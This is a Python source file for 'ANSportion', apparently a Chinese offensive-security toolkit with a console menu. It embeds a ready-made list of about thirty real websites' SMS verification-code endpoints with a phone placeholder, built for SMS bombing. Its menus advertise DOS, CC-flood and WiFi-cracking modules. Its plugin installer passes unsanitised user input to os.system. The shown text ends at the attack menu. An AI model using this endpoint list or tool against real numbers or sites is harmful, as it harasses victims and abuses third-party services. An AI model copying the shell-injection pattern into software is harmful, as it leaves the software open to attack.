#库导入
import os
from colorama import init, Fore
import sys
import platform
import random

#所有初始化
download_html = """<!DOCTYPE html>
<html>
<head>
    <title>Download file</title>
</head>
<body>
    <h1>Welcome to the download page</h1>
    <a href="/download">Download</a>
</body>
</html>"""

target_html = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTML</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #333;
        }
        p {
            text-align: justify;
        }
    </style>
</head>
<body>
    <h1>Hello</h1>
    <p>XXX_STALKER</p>
</body>
</html>"""

plugins_tutorial = """欢迎 您 加入 ANSportion Plugins 计划。

1. 首先我们需要一个引导文件，用于引导 ANSportion 去打开该引导文件的插件。

引导文件格式：

插件名用 'XXX' 代替
文件名: XXX_guide.py
--------------------------------------------------------------------------------------------------------
def RUN():
    print("插件 XXX 正在启动...")
    print("正在检查插件的引导文件...")
    
    with open("plugins/plugins_list.txt", "r", encoding="utf-8") as f:
        plu_list = f.readlines()
        if len(plu_list) == "XXX":
            if "XXX" in plu_list:
                print("插件 XXX 的插件表存在")
            else:
                print("插件 XXX 的插件表不存在")
                choose = input("是否创建插件 XXX 的插件表?(y/n)")
                if choose in ["y", "Y"]:
                    with open("plugins/plugins_list.txt", "a", encoding="utf-8") as f:
                        f.write("XXX\n")
                    print("插件 XXX 的插件表已成功创建")
                else:
                    print("插件 XXX 的插件表已取消创建")
    print("尝试打开插件的引导文件...")
    try:
        import importlib
        module = importlib.import_module("plugins.XXX.XXX_main")
        XXX_run = getattr(module, "XXX_run")
        XXX_run()
    except Exception as e:
        print(f"插件启动失败: {str(e)}")

if __name__ == "__main__":
    RUN()
--------------------------------------------------------------------------------------------------------

2. 写完引导文件之后需要配置插件的主程序文件。

主程序文件的格式:

插件名用 'XXX' 代替
文件名: XXX_main.py
--------------------------------------------------------------------------------------------------------
[ 你的脚本 ]

def XXX_run():
    [ 你的脚本 ]

if __name__ == "__main__":
    print(f"{'-' * 48}\n\t\tANSportion 插件 [ 填写作者名字 ] \n{'-' * 48}")
--------------------------------------------------------------------------------------------------------

4. 最后在写入一个配置该插件的教程文件（用于帮助使用者更好的配置文件）。

直接复制就好，修改插件名就好。
文件名: config XXX.txt
--------------------------------------------------------------------------------------------------------
将 XXX_guide.py 文件移动至 plugins 文件夹里面。
还需要在插件表里面配置该插件的环境，如何配置？
    1. 可以在 ANSportion.py 文件中配置：
        首先运行文件或它的EXE，然后输入指令 'plu' 打开名为 'plu' 的模块，在输入和 '配置指定插件的插件表' 相对应的序列号，
        最后按照提示输入信息就可以配置成功了
    2. 可以直接通过修改 插件表 来进行配置：
        首先打开 plugins/plugins_list.txt 文件，在该文件最后一行输入该插件的名字，名字必须一模一样！（得保证最后一行是空的情况下！就是输入完记得回车！）
--------------------------------------------------------------------------------------------------------

5. 以上格式请严格遵循，否则 ANSportion 将无法识别该插件。

欢迎所有创作者加入 ANSportion Plugins 计划。"""

attack_2_API = """[
    {
        "url": "https://passport.csdn.net/v1/login/sendVerifyCode",
        "headers": {
            "Host": "passport.csdn.net",
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.134 Mobile Safari/537.36"
        },
        "payload": {
            "code": "0086",
            "platform": "WAP",
            "type": "popupLogin",
            "spm": "1001.2101.3001.7902",
            "mobile": ""
        }
    },
    {
        "url": "https://zmingcx.com/wp-content/themes/begin/mail-captcha.php?0.17748457886315183",
        "headers": {
            "Host": "zmingcx.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.134 Mobile Safari/537.36"
        },
        "payload": {
            "action": "eer_captcha",
            "email": "",
            "user_name": "kisskdk"
        }
    },
    {
        "url": "https://shanghai.chinatax.gov.cn/jkfw/api/v1.0/services/ssqh/sendCrcByPhoneNum?phoneNum={mobile}",
        "dynamic": true
    },
    {
        "desc": "用户到家",
        "url": "https://user.daojia.com/mobile/getcode?mobile=[phone]&newVersion=1&bu=112",
        "method": "GET",
        "header": "",
        "data": ""
    },
    {
        "desc": "小叶子app",
        "url": "https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile=[phone]&country_code=86",
        "method": "GET",
        "header": "",
        "data": ""
    },
    {
        "desc": "人人文库",
        "url": "https://www.renrendoc.com/Reg.aspx/GetUserSMSCode",
        "method": "POST",
        "header": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": {
            "userMobile": "[phone]"
        }
    },
    {
        "desc": "巨人网络",
        "url": "https://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=https%3A%2F%2Flogin.ztgame.com%2F&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone=[phone]&mpcode=&pwd=&tname=&idcard=",
        "method": "GET",
        "header": {
            "Referer": "https://reg.ztgame.com/",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": ""
    },
    {
        "desc": "金中网",
        "url": "https://jrh.financeun.com/Login/sendMessageCode3.html?mobile=[phone]&mbid=197858&check=3",
        "method": "GET",
        "header": "",
        "data": ""
    },
    {
        "desc": "永城至敏",
        "url": "http://101.132.126.166:8080/message/sendVerifyCode?callback=successCallback&mobilePhone=[phone]&t=1589625247333action_type=regist&mobile=[phone]",
        "method": "GET",
        "header": "",
        "data": ""
    },
    {
        "desc": "某数图表web(存疑)",
        "url": "https://dycharts.com/vis/auth/send_signin_sms_code",
        "method": "POST",
        "header": "",
        "data": {
            "phoneNo": "13809213237"
        }
    },
    {
        "desc": "加密电话",
        "url": "https://m.4009991000.com/valNumQry.action",
        "method": "POST",
        "header": "",
        "data": {
            "appType": "1",
            "app_id": "5555",
            "mobileNo": "[phone]",
            "sig": "16cd52ea74f5ea4a6c2fe80b9a04f8b5",
            "src": "1",
            "v": "4.9.2",
            "validType": "3"
        }
    },
    {
        "desc": "秘塔写作",
        "url": "https://xiezuocat.com/verify?type=signup",
        "method": "POST",
        "header": "",
        "data": {
            "phone": "86-[phone]"
        }
    },
    {
        "desc": "乐教乐学",
        "url": "http://id.lejiaolexue.com/api/sendvericode.ashx?phone=[phone]",
        "method": "GET",
        "header": "",
        "data": ""
    },
    {
        "desc": "网心云APP",
        "url": "https://account-box.onethingpcs.com/xluser.core.login/v3/sendsms",
        "method": "POST",
        "header": "",
        "data": {
            "protocolVersion": "301",
            "sequenceNo": "1000001",
            "platformVersion": "10",
            "isCompressed": "0",
            "appid": "22017",
            "clientVersion": "3.15.1",
            "peerID": "00000000000000000000000000000000",
            "appName": "ANDROID-com.onethingcloud.android",
            "sdkVersion": "204500",
            "devicesign": "div101.095893e2bfa13a199f83691076c8bbb9ab0d01f75c929975048142c2fa38402b",
            "netWorkType": "WIFI",
            "providerName": "NONE",
            "deviceModel": "M2102J2SC",
            "deviceName": "Xiaomi M2102j2sc",
            "OSVersion": "11",
            "creditkey": "",
            "hl": "zh-CN",
            "mobile": "[phone]",
            "register": "0"
        }
    },
    {
        "desc": "费耘网",
        "url": "https://www.feeclouds.com/homepage/register/send",
        "method": "POST",
        "header": "",
        "data": {
            "mobile": "[phone]"
        }
    },
    {
        "desc": "广东省心理学会",
        "url": "http://gpa-gd.scnu.edu.cn/member/index/public_send_code.html",
        "method": "POST",
        "header": "",
        "data": {
            "phone": "[phone]"
        }
    },
    {
        "desc": "火象",
        "url": "https://v1.alphazone-data.cn/academy/api/v1/sendsms",
        "method": "POST",
        "header": "",
        "data": {
            "temp": "1",
            "phone": "[phone]"
        }
    },
    {
        "desc": "麦克赛尔数字映像",
        "url": "https://www.maxell-dm.cn/Code/CheckImage.aspx",
        "method": "POST",
        "header": "",
        "data": {
            "action": "send",
            "txtMember_Name": "[phone]"
        }
    },
    {
        "desc": "企米子",
        "url": "https://www.xcxui.com/index/register/getcode.html",
        "method": "POST",
        "header": "",
        "data": {
            "tel": "[phone]"
        }
    },
    {
        "desc": "能链开放平台",
        "url": "https://openplatformwsgateway.czb365.com/openplatformws/user/send/sendCheckMsgV7/[phone]",
        "method": "GET",
        "header": "",
        "data": ""
    },
    {
        "desc": "蘑菇云游",
        "url": "https://www.moguyouxi.cn/Home/SendVerificationCode",
        "method": "POST",
        "header": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": "https://www.moguyouxi.cn/"
        },
        "data": {
            "phone": "[phone]",
            "code": ""
        },
        "form": ""
    },
    {
        "desc": "奇热漫画",
        "url": "https://www.qiremanhua.com/passport/send_msg_code",
        "method": "POST",
        "header": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://www.qiremanhua.com/passport/reg/?redirectUri=%2F"
        },
        "data": {
            "phone": "[phone]"
        },
        "form": ""
    },
    {
        "desc": "好好住",
        "url": "https://www.haohaozhu.cn/f/y/api/Login/Identifyingcode",
        "method": "POST",
        "header": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://www.haohaozhu.cn/"
        },
        "data": {
            "phone": "[phone]",
            "country_code":"86",
            "identifying_type":"1"
        },
        "form": ""
    },
    {
        "desc": "宜搜小说",
        "url": "https://book.easou.com/ta/phonevcode.m",
        "method": "POST",
        "header": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://book.easou.com/ta/registerByPhone.m?backUrl=%2Fta%2Findex.m"
        },
        "data": {
            "phone": "[phone]"
        },
        "form": ""
    },
    {
        "desc": "泛付 PanPay",
        "url": "https://www.panpay.com/e-bank/verifyPhoneCode.do",
        "method": "POST",
        "header": {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "data": {
            "phone": "[phone]",
            "tplType": "01",
            "type": "BIND_PHONE",
            "phoneCountry": "86"
        },
        "form": ""
    },
    {
        "desc": "鳳凰金融",
        "url": "https://www.fengwd.com/api/v2/user/loginRegister/captcha/text?version=1.0",
        "method": "post",
        "data": {
            "mobile": "[phone]"
        },
        "header": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Referer": "https://www.fengwd.com/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "fjr_properties=%7B%22abtest%22%3A%22c%22%7D; _ga=GA1.2.1239566769.1689827740; _gid=GA1.2.1620323177.1689827740; _gat=1; Hm_lvt_cca0837a014621d8d933a0b1b2cb0be5=1689827740; Hm_lpvt_cca0837a014621d8d933a0b1b2cb0be5=1689827740; _ga_RQJV198NYX=GS1.2.1689827743.1.0.1689827743.0.0.0"
        },
        "form": ""
    },
    {
        "desc": "四川航空",
        "url": "https://flights.sichuanair.com/3uair/ibe/profile/processSendSMSNew.do?ConversationID=&smsType=REGISTER&mobilePhone=[phone]&verkey=MOBILELOGIN",
        "method": "get",
        "data": "",
        "header": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Referer": "https://flights.sichuanair.com/3uair/ibe/profile/createProfile.do"
        }
    },
    {
        "desc": "安徽相亲网",
        "url": "https://www.ahxiangqin.cn/index.php?c=picker&a=sendmobile",
        "method": "post",
        "data": {
            "type": "reg",
            "mobile": "[phone]",
            "imgcode": "validcode",
            "email": "[phone]",
            "qq": "[phone]"
        },
        "header": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Referer": "https://www.ahxiangqin.cn/index.php?c=passport&a=reg",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "form": ""
    },
    {
        "desc": "印象笔记",
        "url": "https://app.yinxiang.com/SendOneTimePassword.action?sig=b4d74d0018ad5084638ae1333f4c2a61&recipient=[phone]&textotp=",
        "method": "get",
        "data": "",
        "header": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
        }
    }
]"""

cc_headers = """'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'"""

def init_ANS_plugins():
    if not os.path.exists("plugins"):
        os.mkdir("plugins")
    
    if not os.path.exists("plugins/plugins_list.txt"):
        with open("plugins/plugins_list.txt", 'w', encoding='utf-8') as file:
            file.write("")
    
    if not os.path.exists("plugins/plugins_tutorial.txt"):
        with open("plugins/plugins_tutorial.txt", 'w', encoding='utf-8') as file:
            file.write(plugins_tutorial)
    
    if not os.path.exists("attack_2_API.json"):
        with open("attack_2_API.json", "w", encoding='utf-8') as file:
            file.write(attack_2_API)
    
    if not os.path.exists("HTML_Code"):
        os.mkdir("HTML_Code")
    
    if not os.path.exists("HTML_Code/target.html"):
        with open("HTML_Code/target.html", 'w', encoding='utf-8') as file:
            file.write(target_html)
    
    if not os.path.exists("HTML_Code/download.html"):
        with open("HTML_Code/download.html", 'w', encoding='utf-8') as file:
            file.write(download_html)
    
    if not os.path.exists("cc_headers.txt"):
        with open("cc_headers.txt", 'w', encoding='utf-8') as file:
            file.write(cc_headers)
    
system = platform.system()
init_ANS_plugins()
init()
ANSportion_version = "1.1.9  -  Pro"

ANSportion_input_1 = "┌── ("
ANSportion_input_2 = "ANSportion-PRO"
ANSportion_input_3 = f") ~ [+ {system} +]\n└─ $ "

#自定义导入文字
ANSportion1_1 = """
     ▄▄▄       ███▄    █   ██████  ██▓███   ▒█████   ██▀███  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █ 
    ▒████▄     ██ ▀█   █ ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ 
    ▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
    ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
     ▓█   ▓██▒▒██░   ▓██░▒██████▒▒▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
     ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
      ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░    ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
      ░   ▒      ░   ░ ░ ░  ░  ░  ░░       ░ ░ ░ ▒    ░░   ░   ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ 
          ░  ░         ░       ░               ░ ░     ░               ░      ░ ░           ░ 
"""

ANSportion1_2 = '''
                                                                         ,,  
        db      `7MN.   `7MF'.M"""bgd                             mm     db  
       ;MM:       MMN.    M ,MI    "Y                             MM         
      ,V^MM.      M YMb   M `MMb.   `7MMpdMAo.  ,pW"Wq.`7Mb,od8 mmMMmm `7MM   ,pW"Wq.`7MMpMMMb.  
     ,M  `MM      M  `MN. M   `YMMNq. MM   `Wb 6W'   `Wb MM' "'   MM     MM  6W'   `Wb MM    MM  
     AbmmmqMA     M   `MM.M .     `MM MM    M8 8M     M8 MM       MM     MM  8M     M8 MM    MM  
    A'     VML    M     YMM Mb     dM MM   ,AP YA.   ,A9 MM       MM     MM  YA.   ,A9 MM    MM  
  .AMA.   .AMMA..JML.    YM P"Ybmmd"  MMbmmd'   `Ybmd9'.JMML.     `Mbmo.JMML. `Ybmd9'.JMML  JMML.
                                      MM                                     
                                    .JMML.                                   
'''

ANSportion2 = f"""
版本: {ANSportion_version}
切记不可用于任何非法用途！！！"""

ANSportion3 = """注意!!!:
需要联网，否则部分功能不能使用!

粉丝群: QQ:991478664

=================================================================
输入 'help' 即可查看帮助
=================================================================
输入 'about' 即可查看关于我们的基本信息
================================================================="""

help = """
                       _   _ _____ _     ____  
                      | | | | ____| |   |  _ \ 
                      | |_| |  _| | |   | |_) |
                      |  _  | |___| |___|  __/ 
                      |_| |_|_____|_____|_|    
================================ help ================================
help     ---   View Help                                          查看帮助
exit     ---   exit the program                                   退出程序
cls      ---   clear screen                                       清屏
clear    ---   clear screen                                       清屏
about    ---   About                                              关于我们
log      ---   Check log                                          查看日志
log all  ---   Check all log                                      查看所有日志
----------------------------------------------------------------------
plu      ---   plugins                                            插件
check    ---   check                                              查看
attack   ---   attack                                             攻击
wifi     ---   Wi-Fi                                              Wi-Fi
listen   ---   listen                                             监听
port     ---   port                                               端口
crawler  ---   crawler                                            爬虫
server   ---   server                                             服务器
======================================================================
"""

about = """
================================ about ================================
团队名:
XXX_Stalker

制作者名单:
YoMon                 前端/后端
GHO高泽林GAO          测试

QQ:991478664
GitCode: https://gitcode.com/XXX_Stalker/ANSportion
GitHub: https://github.com/XXX-Stalker/ANSportion
=======================================================================
"""

plugins = """
                                        _             _
                                  _ __ | |_   _  __ _(_)_ __  ___ 
                                 | '_ \| | | | |/ _` | | '_ \/ __|
                                 | |_) | | |_| | (_| | | | | \__ \ 
                                 | .__/|_|\__,_|\__, |_|_| |_|___/
                                 |_|            |___/
============================================== plugins ==============================================
1   ---   check                                                      查看插件
2   ---   check all                                                  查看所有插件
3   ---   Configure the plug-in table for the specified plug-in      配置指定插件的插件表
4   ---   Delete the plug-in table for the specified plug-in         删除指定插件的插件表
5   ---   install                                                    安装插件(需要装 git 并配置好环境)
6   ---   uninstall                                                  卸载插件
7   ---   Reset plug-in table                                        重置插件表
8   ---   Check Official website plugins                             查看官网插件
=====================================================================================================
"""

ANSportion_plugins = """
      ·▄▄▄·▄▄▄▪   ▄▄· ▪   ▄▄▄· ▄▄▌      ▄▄▌ ▐ ▄▌▄▄▄ .▄▄▄▄· .▄▄ · ▪  ▄▄▄▄▄▄▄▄ .     ▄▄▄·▄▄▌  ▄• ▄▌ ▄▄ • ▪   ▐ ▄ .▄▄ · 
▪     ▐▄▄·▐▄▄·██ ▐█ ▌▪██ ▐█ ▀█ ██•      ██· █▌▐█▀▄.▀·▐█ ▀█▪▐█ ▀. ██ •██  ▀▄.▀·    ▐█ ▄███•  █▪██▌▐█ ▀ ▪██ •█▌▐█▐█ ▀. 
 ▄█▀▄ ██▪ ██▪ ▐█·██ ▄▄▐█·▄█▀▀█ ██▪      ██▪▐█▐▐▌▐▀▀▪▄▐█▀▀█▄▄▀▀▀█▄▐█· ▐█.▪▐▀▀▪▄     ██▀·██▪  █▌▐█▌▄█ ▀█▄▐█·▐█▐▐▌▄▀▀▀█▄
▐█▌.▐▌██▌.██▌.▐█▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ▐█▌██▐█▌▐█▄▄▌██▄▪▐█▐█▄▪▐█▐█▌ ▐█▌·▐█▄▄▌    ▐█▪·•▐█▌▐▌▐█▄█▌▐█▄▪▐█▐█▌██▐█▌▐█▄▪▐█
 ▀█▄▀▪▀▀▀ ▀▀▀ ▀▀▀·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀      ▀▀▀▀ ▀▪ ▀▀▀ ·▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀     .▀   .▀▀▀  ▀▀▀ ·▀▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀▀ 
============================================== Official website plugins ==============================================
1   ---   Mans_Ber:
    ---   ---   用法:用于生成加密文件程序的ANSportion插件
    ---   ---   https://github.com/XXX-Stalker/ANS-Mans_Ber
======================================================================================================================
"""

check_help = """
                            ____ _               _    
                           / ___| |__   ___  ___| | __
                          | |   | '_ \ / _ \/ __| |/ /
                          | |___| | | |  __/ (__|   < 
                           \____|_| |_|\___|\___|_|\_\ 
====================================== check ======================================
1   ---   Check your various IP addresses                           查看自己的各个IP
2   ---   Check if the IP is a valid IP                             查看IP是否为有效IP
3   ---   Crawling the real IP of the website                       查看网站真实IP
4   ---   Check the Mac address of me                               查看自己的Mac地址
5   ---   View network interface information                        查看网络接口信息
===================================================================================
"""

attack_help = """
                        _   _   _             _    
                       / \ | |_| |_ __ _  ___| | __
                      / _ \| __| __/ _` |/ __| |/ /
                     / ___ \ |_| || (_| | (__|   <
                    /_/   \_\__|\__\__,_|\___|_|\_\ 
================================ attack ================================
1   ---   DOS Attack Pack                              DOS攻击包
2   ---   SMS bombardment                              短信轰炸
3   ---   CC attack                                    CC攻击包
========================================================================
"""

wifi_help = """
                         __        ___       _____ ___ 
                         \ \      / (_)     |  ___|_ _|
                          \ \ /\ / /| |_____| |_   | |
                           \ V  V / | |_____|  _|  | |
                            \_/\_/  |_|     |_|   |___|
======================================= wifi =======================================
1   ---   Connect to WiFi                                               连接WiFi
2   ---   WiFi hack                                                     WiFi破解
3   ---   Scan surrounding WiFi                                         扫描周围WiFi
4   ---   Unlimited WiFi connection                                     无限连接WiFi
====================================================================================
"""

listen_help = """
                              _     _     _
                             | |   (_)___| |_ ___ _ __
                             | |   | / __| __/ _ \ '_ \ 
                             | |___| \__ \ ||  __/ | | |
                             |_____|_|___/\__\___|_| |_|
====================================== listen ======================================
1   ---   Monitor the port status of the IP host                 监听IP主机的端口状态
====================================================================================
"""

port_help = """
                                      ____            _   
                                     |  _ \ ___  _ __| |_
                                     | |_) / _ \| '__| __|
                                     |  __/ (_) | |  | |_
                                     |_|   \___/|_|   \__|
============================================= port =============================================
1   ---   Check the open ports of the IP                             扫描IP的指定范围的开放端口
2   ---   Check if the port is open                                  扫描指定端口是否开放
================================================================================================
"""

crawler_help = """
                       ____                    _
                      / ___|_ __ __ ___      _| | ___ _ __
                     | |   | '__/ _` \ \ /\ / / |/ _ \ '__|
                     | |___| | | (_| |\ V  V /| |  __/ |
                      \____|_|  \__,_| \_/\_/ |_|\___|_|
=================================== crawler ===================================
1   ---   Crawling the source code of a website                 爬取网站的源代码
2   ---   Crawling website status                               爬取网站状态
===============================================================================
"""

server_help = """
                              ____
                             / ___|  ___ _ ____   _____ _ __
                             \___ \ / _ \ '__\ \ / / _ \ '__|
                              ___) |  __/ |   \ V /  __/ |
                             |____/ \___|_|    \_/ \___|_|
========================================== server ==========================================
1   ---   Create a server (website)                             创建一个服务器(网站)
2   ---   Create a download file server (website)               创建一个下载文件服务器(网站)
============================================================================================
"""

#程序代码函数主体
def program_code_body():
    while True:
        try:
            program_input = input(Fore.MAGENTA + ANSportion_input_1 + Fore.RED + ANSportion_input_2 + Fore.MAGENTA + ANSportion_input_3 + Fore.RESET)
            if program_input == "help":#系统指令 提供帮助
                print(help)
            elif program_input == "exit":#系统指令 退出程序
                sys.exit()
            elif program_input in ["cls", "clear"]:#系统指令 清屏
                os.system("cls" if os.name == 'nt' else 'clear')
            elif program_input == "about":#系统指令 关于我们
                print(about)
            elif program_input == "log":#查看更新日志
                if os.path.exists("更新日志1.ans"):
                    with open("更新日志1.ans", 'r', encoding='utf-8') as file:
                        log_content = file.read()
                    print(f"{'=' * 65}\n更新日志内容:")
                    print(log_content,f"\n{'=' * 65}")
                else:
                    print("更新日志文件不存在")
            elif program_input == "log all":#查看所有的更新日志
                if os.path.exists("更新日志2.ans"):
                    with open("更新日志2.ans", 'r', encoding='utf-8') as file:
                        log_content = file.read()
                    print(f"{'=' * 65}\n更新日志内容:")
                    print(log_content, f"\n{'=' * 65}")
                else:
                    print("更新日志文件不存在")
            elif program_input == "check l":#查看指定的库是否安装
                check_l = input("请输入要检查的库名:")
                import importlib.util
                def is_library_installed(library_name):
                    spec = importlib.util.find_spec(library_name)
                    return spec is not None
                library_name = check_l
                if is_library_installed(library_name):
                    print(f"{library_name} 已安装")
                else:
                    print(f"{library_name} 未安装")

            elif program_input == "plu":#工具包指令 查看插件
                print(plugins)
                program_plugins = input(":")
                if program_plugins == "1":  # 工具包指令 查看插件
                    plugins_file = input("请输入要查看的插件名:").strip()  # 去除输入的首尾空格
                    try:
                        with open("plugins/plugins_list.txt", 'r', encoding='utf-8') as file:
                            plugins_list = file.read().splitlines()  # 获取所有插件列表
                            
                            if plugins_file in plugins_list:  # 检查插件是否存在列表中
                                print(f"插件 '{plugins_file}' 状态: 已安装")
                            else:
                                print(f"插件 '{plugins_file}' 状态: 未安装")
                    except FileNotFoundError:
                        print("错误：插件列表文件 plugins_list.txt 不存在")
                    except Exception as e:
                        print(f"检查插件时出错: {str(e)}")
                elif program_plugins == "2":#工具包指令 查看所有插件
                    try:
                        with open("plugins/plugins_list.txt", 'r', encoding='utf-8') as file:
                            plugins_list = file.read()
                            print(f"插件表\n{'=' * 30}\n{plugins_list}\n{'=' * 30}")
                    except FileNotFoundError:
                        print(f"{plugins_file} 插件表不存在!!!可以再 plugins 模块修复")
                elif program_plugins == "3":#工具包指令 配置插件环境
                    plugins_list_cfile = input("请输入要配置的插件名:")
                    with open("plugins/plugins_list.txt", 'a', encoding='utf-8') as file:
                        file.write(plugins_list_cfile + "\n")
                    print(f"插件 {plugins_list_cfile} 已配置")
                elif program_plugins == "4":  # 工具包指令 删除插件环境
                    plugins_list_dfile = input("请输入要删除的插件名:")
                    try:
                        with open("plugins/plugins_list.txt", 'r', encoding='utf-8') as file:
                            plugins_list = file.readlines()
                        found = False
                        new_list = []
                        for line in plugins_list:
                            if line.rstrip('\n') == plugins_list_dfile:
                                found = True
                            else:
                                new_list.append(line)
                        if found:
                            with open("plugins/plugins_list.txt", 'w', encoding='utf-8') as file:
                                file.writelines(new_list)
                            print(f"插件 {plugins_list_dfile} 已删除")
                        else:
                            print(f"插件 {plugins_list_dfile} 不存在于列表中")
                    except FileNotFoundError:
                        print("错误: plugins_list.txt 文件未找到")
                    except Exception as e:
                        print(f"删除插件时出错: {str(e)}")
                elif program_plugins == "5":  # 工具包指令 安装插件
                    plugins_install = input("请输入要安装的插件网址:").strip()
                    url_path = "plugins"
                    try:
                        os.makedirs(url_path, exist_ok=True)
                        command = f"git clone {plugins_install} {url_path}/{plugins_install.split('/')[-1].replace('.git', '')}"
                        return_code = os.system(command)
                        if return_code == 0:
                            print(f"插件已成功安装在 {url_path} 目录下")
                            print("请手动配置该插件的插件表")
                        else:
                            print(f"插件安装失败,git返回码: {return_code}")
                    except Exception as e:
                        print(f"安装插件时出错: {str(e)}")
                elif program_plugins == "6":  # 工具包指令 卸载插件
                    plugins_uninstall = input("请输入要卸载的插件名:").strip()
                    choose = input("是否删除插件?(y/n)").strip().lower()
                    if choose == "y":
                        plugins_dir = f"plugins/{plugins_uninstall}"
                        guide_file = f"plugins/{plugins_uninstall}_guide.py"
                        try:
                            if os.path.exists(plugins_dir):
                                import shutil
                                shutil.rmtree(plugins_dir)
                                print(f"已删除插件目录: {plugins_dir}")
                            else:
                                print(f"警告: 插件目录 {plugins_dir} 不存在")
                            if os.path.exists(guide_file):
                                os.remove(guide_file)
                                print(f"已删除指南文件: {guide_file}")
                            else:
                                print(f"警告: 指南文件 {guide_file} 不存在")
                            try:
                                list_file = "plugins/plugins_list.txt"
                                if os.path.exists(list_file):
                                    with open(list_file, 'r', encoding='utf-8') as file:
                                        plugins_list = file.readlines()
                                    new_list = [line for line in plugins_list if line.strip() != plugins_uninstall]
                                    if len(new_list) != len(plugins_list):
                                        with open(list_file, 'w', encoding='utf-8') as file:
                                            file.writelines(new_list)
                                        print(f"已从插件列表中移除: {plugins_uninstall}")
                                    else:
                                        print(f"提示: {plugins_uninstall} 不在插件列表中")
                                else:
                                    print("警告: plugins_list.txt 文件不存在，跳过列表更新")
                            except Exception as e:
                                print(f"更新插件列表时出错: {str(e)}")
                            print(f"插件 {plugins_uninstall} 卸载完成")
                        except Exception as e:
                            print(f"删除插件时发生严重错误: {str(e)}")
                    else:
                        print("已取消删除插件")
                elif program_plugins == "7":#工具包指令 重置插件表
                    if os.path.exists("plugins/plugins_list.txt"):
                        choose = input("插件表存在\n是否重置?(Y/N):")
                        if choose in ["y", "Y"]:
                            with open("plugins/plugins_list.txt", 'w', encoding='utf-8') as file:
                                file.write("")
                            print("插件表已重置")
                        else:
                            print("已取消重置插件表")
                    else:
                        print("插件表不存在 即将创建...")
                        with open("plugins/plugins_list.txt", 'w', encoding='utf-8') as file:
                            file.write("")
                        print("插件表已创建成功")
                elif program_plugins == "8":#工具包指令 查看官网插件
                    print(ANSportion_plugins)

            elif program_input == "check":#工具包指令 使用工具包
                print(check_help)
                program_check = input(":")
                if program_check == "1":#工具包指令 查看自己的各个IP
                    from Code.check_1 import check_1_main
                    check_1_main()
                elif program_check == "2":#工具包指令 查看IP是否为有效IP
                    from Code.check_2 import check_2_main
                    check_2_main()
                elif program_check == "3":#工具包指令 查看网站真实IP
                    from Code.check_3 import check_3_main
                    check_3_main()
                elif program_check == "4":#工具包指令 查看我的的Mac地址
                    from Code.check_4 import check_4_main
                    check_4_main()
                elif program_check == "5":#工具包指令 查看网络接口信息
                    from Code.check_5 import check_5_main
                    check_5_main()

            elif program_input == "attack":
                print(attack_help)
